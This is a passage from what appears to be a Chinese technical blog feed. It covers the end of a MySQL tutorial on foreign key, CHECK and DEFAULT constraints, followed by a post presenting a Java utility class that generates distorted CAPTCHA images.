<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.table_constraints <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;emp&#x27;</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">drop</span> <span class="keyword">foreign</span> key emp_ibfk_1;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.02</span> sec)</span><br><span class="line">Records: <span class="number">0</span> Duplicates: <span class="number">0</span> Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> index <span class="keyword">from</span> emp;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">drop</span> index deptid;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">Records: <span class="number">0</span> Duplicates: <span class="number">0</span> Warnings: <span class="number">0</span></span><br></pre></td></tr></table></figure>



<hr>
<h1 id="七、检查约束"><a href="#七、检查约束" class="headerlink" title="七、检查约束"></a>七、检查约束</h1><p><strong>作用</strong>：检查某个字段的值是否符号xx要求，一般指的是值的范围。<br><strong>关键字</strong>： <code>CHECK</code></p>
<blockquote>
<p>MySQL5.7 可以使用check约束，但check约束对数据验证没有任何作用。添加数据时，没有任何错误或警告，但是MySQL8.0中可以使用check约束了。</p>
</blockquote>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test10(</span><br><span class="line">	id <span class="type">INT</span>,</span><br><span class="line">	last_name <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">	salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="keyword">CHECK</span>(salary <span class="operator">&gt;</span> <span class="number">2000</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># Mysql <span class="number">5.7</span>插入成功  Mysql8<span class="number">.0</span>插入失败</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test10</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="number">1500</span>);</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="八、-DEFAULT约束"><a href="#八、-DEFAULT约束" class="headerlink" title="八、 DEFAULT约束"></a>八、 DEFAULT约束</h1><p><strong>作用</strong>：给某个字段&#x2F;某列指定默认值，一旦设置默认值，在插入数据时，如果此字段没有显式赋值，则赋值为默认值。</p>
<p><strong>关键字</strong>：<code>DEFAULT</code></p>
<h2 id="1-给字段加默认值"><a href="#1-给字段加默认值" class="headerlink" title="1. 给字段加默认值"></a>1. 给字段加默认值</h2><p><strong>（1）建表时</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名称(</span><br><span class="line">	字段名 数据类型,</span><br><span class="line">	字段名 数据类型 <span class="keyword">DEFAULT</span> 默认值,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 默认值约束一般不在唯一键和主键列上加</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test11(</span><br><span class="line">	id <span class="type">INT</span>,</span><br><span class="line">	last_name <span class="type">VARCHAR</span>(<span class="number">15</span>),</span><br><span class="line">	salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="number">2000</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p><strong>（2）建表后</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型 <span class="keyword">DEFAULT</span> 默认值;</span><br><span class="line"></span><br><span class="line"># 如果这个字段原来有非空约束，你还保留非空约束，那么在加默认值约束时，还得保留非空约束，否则非空约束就被删除了</span><br><span class="line"># 同理，在给某个字段加非空约束也一样，如果这个字段原来有默认值约束，你想保留，也要在modify语句中保留默认值约束，否则就删除了</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型 <span class="keyword">DEFAULT</span> 默认值 <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test12</span><br><span class="line">MODIFY salary <span class="type">DECIMAL</span>(<span class="number">8</span>,<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="number">2500</span>;</span><br></pre></td></tr></table></figure>


<h2 id="2-删除DEFAULT约束"><a href="#2-删除DEFAULT约束" class="headerlink" title="2. 删除DEFAULT约束"></a>2. 删除DEFAULT约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型 ;# 删除默认值约束，也不保留非空约束</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名称 MODIFY 字段名 数据类型 <span class="keyword">NOT</span> <span class="keyword">NULL</span>; # 删除默认值约束，保留非空约束</span><br></pre></td></tr></table></figure>


<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test12</span><br><span class="line">MODIFY salary <span class="type">DECIMAL</span>(<span class="number">8</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Java生成验证码</title>
    <url>/posts/62f2aa05.html</url>
    <content><![CDATA[<blockquote>
<p><strong>CheckCodeUtil工具类的使用。只需调用<code>outputVerifyImage()</code>方法即可。</strong></p>
</blockquote>
<p><strong>使用案例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	<span class="type">OutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;输出验证码图片的路径&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">checkCode</span> <span class="operator">=</span> CheckCodeUtil.outputVerifyImage(<span class="number">100</span>, <span class="number">50</span>, fos, <span class="number">4</span>);</span><br><span class="line">	System.out.println(checkCode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>web页面使用案例：</strong><br><strong>只需将输出流换成Response对象的字节输出流即可。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	<span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">	<span class="type">String</span> <span class="variable">checkCode</span> <span class="operator">=</span> CheckCodeUtil.outputVerifyImage(<span class="number">100</span>, <span class="number">50</span>, outputStream, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>CheckCodeUtil工具类代码如下：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.geom.AffineTransform;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成验证码工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CheckCodeUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证码待选值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">VERIFY_CODES</span> <span class="operator">=</span> <span class="string">&quot;123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 输出随机验证码图片流,并返回验证码值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> width 图片宽度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> height 图片高度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> os 输出流</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> verifySize 数据长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 验证码数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">outputVerifyImage</span><span class="params">(<span class="type">int</span> width, <span class="type">int</span> height, OutputStream os, <span class="type">int</span> verifySize)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">verifyCode</span> <span class="operator">=</span> generateVerifyCode(verifySize);</span><br><span class="line">        outputImage(width, height, os, verifyCode);</span><br><span class="line">        <span class="keyword">return</span> verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用系统默认字符源生成验证码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> verifySize 验证码长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateVerifyCode</span><span class="params">(<span class="type">int</span> verifySize)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> generateVerifyCode(verifySize, VERIFY_CODES);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用指定源生成验证码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> verifySize 验证码长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sources    验证码字符源</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateVerifyCode</span><span class="params">(<span class="type">int</span> verifySize, String sources)</span> &#123;</span><br><span class="line">        <span class="comment">// 未设定展示源的字码，赋默认值大写字母+数字</span></span><br><span class="line">        <span class="keyword">if</span> (sources == <span class="literal">null</span> || sources.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            sources = VERIFY_CODES;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">codesLen</span> <span class="operator">=</span> sources.length();</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis());</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">verifyCode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(verifySize);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; verifySize; i++) &#123;</span><br><span class="line">            verifyCode.append(sources.charAt(rand.nextInt(codesLen - <span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> verifyCode.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成随机验证码文件,并返回验证码值 (生成图片形式，用的较少)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> width</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> height</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputFile</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> verifySize</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">outputVerifyImage</span><span class="params">(<span class="type">int</span> width, <span class="type">int</span> height, File outputFile, <span class="type">int</span> verifySize)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">verifyCode</span> <span class="operator">=</span> generateVerifyCode(verifySize);</span><br><span class="line">        outputImage(width, height, outputFile, verifyCode);</span><br><span class="line">        <span class="keyword">return</span> verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成指定验证码图像文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> width</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> height</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputFile</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> code</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">outputImage</span><span class="params">(<span class="type">int</span> width, <span class="type">int</span> height, File outputFile, String code)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (outputFile == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> outputFile.getParentFile();</span><br><span class="line">        <span class="comment">//文件不存在</span></span><br><span class="line">        <span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">            <span class="comment">//创建</span></span><br><span class="line">            dir.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            outputFile.createNewFile();</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outputFile);</span><br><span class="line">            outputImage(width, height, fos, code);</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 输出指定验证码图片流</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> width</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> height</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> os</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> code</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">outputImage</span><span class="params">(<span class="type">int</span> width, <span class="type">int</span> height, OutputStream os, String code)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">verifySize</span> <span class="operator">=</span> code.length();</span><br><span class="line">        <span class="type">BufferedImage</span> <span class="variable">image</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedImage</span>(width, height, BufferedImage.TYPE_INT_RGB);</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">Graphics2D</span> <span class="variable">g2</span> <span class="operator">=</span> image.createGraphics();</span><br><span class="line">        g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建颜色集合，使用java.awt包下的类</span></span><br><span class="line">        Color[] colors = <span class="keyword">new</span> <span class="title class_">Color</span>[<span class="number">5</span>];</span><br><span class="line">        Color[] colorSpaces = <span class="keyword">new</span> <span class="title class_">Color</span>[]&#123;Color.WHITE, Color.CYAN,</span><br><span class="line">                Color.GRAY, Color.LIGHT_GRAY, Color.MAGENTA, Color.ORANGE,</span><br><span class="line">                Color.PINK, Color.YELLOW&#125;;</span><br><span class="line">        <span class="type">float</span>[] fractions = <span class="keyword">new</span> <span class="title class_">float</span>[colors.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; colors.length; i++) &#123;</span><br><span class="line">            colors[i] = colorSpaces[rand.nextInt(colorSpaces.length)];</span><br><span class="line">            fractions[i] = rand.nextFloat();</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(fractions);</span><br><span class="line">        <span class="comment">// 设置边框色</span></span><br><span class="line">        g2.setColor(Color.GRAY);</span><br><span class="line">        g2.fillRect(<span class="number">0</span>, <span class="number">0</span>, width, height);</span><br><span class="line"></span><br><span class="line">        <span class="type">Color</span> <span class="variable">c</span> <span class="operator">=</span> getRandColor(<span class="number">200</span>, <span class="number">250</span>);</span><br><span class="line">        <span class="comment">// 设置背景色</span></span><br><span class="line">        g2.setColor(c);</span><br><span class="line">        g2.fillRect(<span class="number">0</span>, <span class="number">2</span>, width, height - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 绘制干扰线</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="comment">// 设置线条的颜色</span></span><br><span class="line">        g2.setColor(getRandColor(<span class="number">160</span>, <span class="number">200</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> random.nextInt(width - <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> random.nextInt(height - <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">xl</span> <span class="operator">=</span> random.nextInt(<span class="number">6</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">yl</span> <span class="operator">=</span> random.nextInt(<span class="number">12</span>) + <span class="number">1</span>;</span><br><span class="line">            g2.drawLine(x, y, x + xl + <span class="number">40</span>, y + yl + <span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加噪点</span></span><br><span class="line">        <span class="comment">// 噪声率</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">yawpRate</span> <span class="operator">=</span> <span class="number">0.05f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">area</span> <span class="operator">=</span> (<span class="type">int</span>) (yawpRate * width * height);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; area; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> random.nextInt(width);</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> random.nextInt(height);</span><br><span class="line">            <span class="comment">// 获取随机颜色</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">rgb</span> <span class="operator">=</span> getRandomIntColor();</span><br><span class="line">            image.setRGB(x, y, rgb);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 添加图片扭曲</span></span><br><span class="line">        shear(g2, width, height, c);</span><br><span class="line"></span><br><span class="line">        g2.setColor(getRandColor(<span class="number">100</span>, <span class="number">160</span>));</span><br><span class="line">        <span class="type">int</span> <span class="variable">fontSize</span> <span class="operator">=</span> height - <span class="number">4</span>;</span><br><span class="line">        <span class="type">Font</span> <span class="variable">font</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Font</span>(<span class="string">&quot;Algerian&quot;</span>, Font.ITALIC, fontSize);</span><br><span class="line">        g2.setFont(font);</span><br><span class="line">        <span class="type">char</span>[] chars = code.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; verifySize; i++) &#123;</span><br><span class="line">            <span class="type">AffineTransform</span> <span class="variable">affine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AffineTransform</span>();</span><br><span class="line">            affine.setToRotation(Math.PI / <span class="number">4</span> * rand.nextDouble() * (rand.nextBoolean() ? <span class="number">1</span> : -<span class="number">1</span>), (width / verifySize) * i + fontSize / <span class="number">2</span>, height / <span class="number">2</span>);</span><br><span class="line">            g2.setTransform(affine);</span><br><span class="line">            g2.drawChars(chars, i, <span class="number">1</span>, ((width - <span class="number">10</span>) / verifySize) * i + <span class="number">5</span>, height / <span class="number">2</span> + fontSize / <span class="number">2</span> - <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        g2.dispose();</span><br><span class="line">        ImageIO.write(image, <span class="string">&quot;jpg&quot;</span>, os);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 随机颜色</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Color <span class="title function_">getRandColor</span><span class="params">(<span class="type">int</span> fc, <span class="type">int</span> bc)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (fc &gt; <span class="number">255</span>) &#123;</span><br><span class="line">            fc = <span class="number">255</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bc &gt; <span class="number">255</span>) &#123;</span><br><span class="line">            bc = <span class="number">255</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> fc + random.nextInt(bc - fc);</span><br><span class="line">        <span class="type">int</span> <span class="variable">g</span> <span class="operator">=</span> fc + random.nextInt(bc - fc);</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> fc + random.nextInt(bc - fc);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Color</span>(r, g, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getRandomIntColor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] rgb = getRandomRgb();</span><br><span class="line">        <span class="type">int</span> <span class="variable">color</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c : rgb) &#123;</span><br><span class="line">            color = color &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            color = color | c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] getRandomRgb() &#123;</span><br><span class="line">        <span class="type">int</span>[] rgb = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            rgb[i] = random.nextInt(<span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rgb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shear</span><span class="params">(Graphics g, <span class="type">int</span> w1, <span class="type">int</span> h1, Color color)</span> &#123;</span><br><span class="line">        shearX(g, w1, h1, color);</span><br><span class="line">        shearY(g, w1, h1, color);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shearX</span><span class="params">(Graphics g, <span class="type">int</span> w1, <span class="type">int</span> h1, Color color)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">period</span> <span class="operator">=</span> random.nextInt(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">borderGap</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">frames</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">phase</span> <span class="operator">=</span> random.nextInt(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; h1; i++) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> (<span class="type">double</span>) (period &gt;&gt; <span class="number">1</span>)</span><br><span class="line">                    * Math.sin((<span class="type">double</span>) i / (<span class="type">double</span>) period</span><br><span class="line">                    + (<span class="number">6.2831853071795862D</span> * (<span class="type">double</span>) phase)</span><br><span class="line">                    / (<span class="type">double</span>) frames);</span><br><span class="line">            g.copyArea(<span class="number">0</span>, i, w1, <span class="number">1</span>, (<span class="type">int</span>) d, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (borderGap) &#123;</span><br><span class="line">                g.setColor(color);</span><br><span class="line">                g.drawLine((<span class="type">int</span>) d, i, <span class="number">0</span>, i);</span><br><span class="line">                g.drawLine((<span class="type">int</span>) d + w1, i, w1, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shearY</span><span class="params">(Graphics g, <span class="type">int</span> w1, <span class="type">int</span> h1, Color color)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">period</span> <span class="operator">=</span> random.nextInt(<span class="number">40</span>) + <span class="number">10</span>; <span class="comment">// 50;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">borderGap</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">frames</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">phase</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; w1; i++) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> (<span class="type">double</span>) (period &gt;&gt; <span class="number">1</span>)</span><br><span class="line">                    * Math.sin((<span class="type">double</span>) i / (<span class="type">double</span>) period</span><br><span class="line">                    + (<span class="number">6.2831853071795862D</span> * (<span class="type">double</span>) phase)</span><br><span class="line">                    / (<span class="type">double</span>) frames);</span><br><span class="line">            g.copyArea(i, <span class="number">0</span>, <span class="number">1</span>, h1, <span class="number">0</span>, (<span class="type">int</span>) d);</span><br><span class="line">            <span class="keyword">if</span> (borderGap) &#123;</span><br><span class="line">                g.setColor(color);</span><br><span class="line">                g.drawLine(i, (<span class="type">int</span>) d, i, <span class="number">0</span>);</span><br><span class="line">                g.drawLine(i, (<span class="type">int</span>) d + h1, i, h1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

